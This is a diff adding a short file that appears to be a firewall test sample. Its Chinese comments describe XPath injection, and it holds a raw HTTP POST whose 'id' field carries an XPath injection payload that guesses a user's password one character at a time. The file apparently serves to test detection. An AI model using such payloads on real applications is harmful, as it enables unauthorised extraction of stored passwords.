@@ -1,0 +1,10 @@
+# SQL注入_XPATH注入_密码猜解
+# XPath 注入是一种针对使用 XPath 查询语言的应用程序的攻击方式，类似于 SQL 注入。XPath 是一种用于在 XML 文档中定位信息的查询语言。通过在应用程序中构造恶意的输入，攻击者可以利用 XPath 注入漏洞来执行未经授权的操作或获取敏感信息。
+POST /?bid=hd_tag_m8mv25v8 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25v8
+RM-PRO-Token: 7a24e5b2ffedf59a9489669fb96131c0
+RM-PRO-Time: 1742808509061
+User-Agent: curl/7.83.1
+
+id=' or //address[surname/text()='Gates' and substring(password/text(),1,1)='M'] and 'a'='a
